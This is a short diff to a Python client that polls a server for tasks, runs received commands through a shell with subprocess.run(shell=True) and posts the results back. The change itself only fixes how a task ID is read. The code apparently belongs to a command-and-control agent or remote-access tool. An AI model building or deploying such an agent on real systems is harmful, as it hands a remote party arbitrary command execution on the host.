@@ -48,11 +48,12 @@ class Client:
                     time.sleep(120)
                     continue
                 task = tasks.get('action')
+                task_id = tasks.get('task_id')
                 print(task)
                 if task == "command":
                     command = req.json().get('command')
                     ps = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=60, check=True)
-                    data = {'agent_id':self.local_ip,'task_id': task['task_id'], 'result': 'NULL','returncode': ps.returncode}
+                    data = {'agent_id':self.local_ip,'task_id': task_id, 'result': 'NULL','returncode': ps.returncode}
                     req = requests.post(f"http://{self.server_ip}:{self.port}/results", json=data)
                 elif task == "download":
                     pass
@@ -61,7 +62,7 @@ class Client:
                 else:
                     raise ValueError("Invalid task type")
             except subprocess.CalledProcessError as e:
-                data = {'task_id': task['task_id'], 'result': e.stderr,'returncode': e.returncode}
+                data = {'task_id': task_id, 'result': e.stderr,'returncode': e.returncode}
                 req = requests.post(f"http://{self.server_ip}:{self.port}/results", json=data)
             except Exception as e:
                 print(e)
